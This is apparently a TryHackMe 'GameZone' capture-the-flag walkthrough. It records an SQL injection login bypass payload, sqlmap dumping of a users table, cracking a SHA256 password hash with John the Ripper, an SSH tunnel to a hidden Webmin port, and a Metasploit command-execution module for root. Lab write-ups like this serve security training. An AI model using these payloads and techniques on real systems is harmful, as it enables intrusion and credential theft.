# GameZone


Walkthrough, see full steps here: https://tryhackme.com/room/gamezone

### User Flag

Easy SQLi query works here to bypass login: `' or 1=1 -- -`

Portal.php also vulnerable to SQLi, easy query works again

By attempting `database()` it gives an error stating the database is MySQL

Lets run SQLmap against it!

Save the request in Burp to a file, then run this command:
```sqlmap -r request.txt --dbms=mysql --dump```

SQLmap found users table:
```
Database: db
Table: users
[1 entry]
+------------------------------------------------------------------+----------+
| pwd                                                              | username |
+------------------------------------------------------------------+----------+
| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |
+------------------------------------------------------------------+----------+
```

Save the hash to a file, then run John the Ripper:
```john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256```

Found the password! `videogamer124`

Log into SSH: `ssh agent47@GameZone.ctf`

Cat the flag!


### Root Flag

Setting up an SSH Tunnel

Run ss on the target machine to find ports that we cannot find remotely
```
agent47@gamezone:~$ ss -tulpn
Netid State      Recv-Q Send-Q  Local Address:Port                 Peer Address:Port
tcp   LISTEN     0      128                 *:10000                           *:*
```

To tunnel port 10000 we can use SSH: `ssh -L 10000:localhost:10000 agent47@gamezone.ctf`

Then use a web browser to go to the webserver: `http://127.0.0.1:10000/`

It seems to be an admin portal, the same username/password works to log in

Service is webmin 1.580, searchsploit found an MSF exploit: `exploit(unix/webapp/webmin_show_cgi_exec)`

We have root!

